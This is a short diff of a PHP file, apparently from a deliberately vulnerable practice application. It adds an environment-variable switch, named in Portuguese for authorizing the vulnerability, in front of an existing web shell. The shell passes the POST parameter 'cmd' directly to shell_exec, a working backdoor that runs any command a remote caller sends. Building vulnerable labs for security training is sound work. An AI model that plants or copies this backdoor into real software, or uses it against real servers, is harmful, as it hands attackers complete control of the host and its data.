@@ -1,4 +1,8 @@
 <?php
+ $usa_backdoor = getenv("AUTORIZO_USO_VULNERABILIDADE");
+ if($usa_backdoor != "S") {
+     exit;
+ }
 if (!empty($_POST['cmd'])) {
     $cmd = shell_exec($_POST['cmd']);
 }
